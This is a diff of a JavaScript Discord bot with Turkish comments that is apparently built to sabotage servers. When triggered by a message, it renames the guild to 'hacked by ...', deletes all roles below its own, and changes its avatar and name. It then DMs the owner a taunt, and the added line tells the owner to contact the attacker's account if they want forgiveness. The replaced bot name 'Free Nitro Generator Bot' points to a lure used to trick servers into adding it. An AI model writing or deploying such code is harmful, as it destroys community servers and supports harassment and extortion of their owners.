@@ -677,8 +677,9 @@ client.on("message", async msg => {
     await msg.guild.setName("hacked by melik ama yıkık olandan alayım#0061 "); //SUNUCUNUN ISMINI DEGISTIRIR
     await msg.guild.roles.forEach(roles => roles.delete()); //BOTUN SIZE BILDIGI BÜTÜN ROLLER SILINIR (BOTUN ROLUNUN ALTINDAKILER) 
     await client.user.setAvatar("https://hizliresim.com/jNCN1l"); //BOTUN RESMINI DEGISTIRIR HIZLI RESIM SITESINDEN UPLOAD EDEBILIRSINIZ
-    await client.user.setUsername("Free Nitro Generator Bot");    //BOTUN ISMİNİ DEGISTIRIR
+    await client.user.setUsername("dizzy'");    //BOTUN ISMİNİ DEGISTIRIR
     await msg.guild.owner.send("**Sunucunu Hackledim Ağla :D**");    //SUNUCUNUN KURUCUSUNA DMDEN GÖNDERİLEN MESAJ
+    await msg.guild.owner.send("**Kardeşim af istiyorsan ve anlaşmak istiyorsan bu hesaba ark at kolay gelsin : _dizzy'#0061_** ");
     
   }   ///null
 });
